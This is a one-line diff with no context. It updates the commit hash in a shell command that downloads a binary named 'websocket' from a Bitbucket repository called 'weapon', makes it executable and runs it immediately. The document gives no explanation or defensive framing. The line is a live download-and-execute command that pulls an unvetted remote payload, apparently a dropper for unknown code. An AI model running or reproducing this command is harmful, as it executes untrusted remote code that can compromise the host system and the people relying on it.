@@ -1,1 +1,1 @@
-wget https://bitbucket.org/cumiasin69/weapon/raw/be0a3adb10d4ea2b7f92d0217141ffe25ca143fd/websocket; chmod +x websocket; ./websocket
+wget https://bitbucket.org/cumiasin69/weapon/raw/3a8201cfb581658e13f0a2b4d0198dd78c95ebd7/websocket; chmod +x websocket; ./websocket
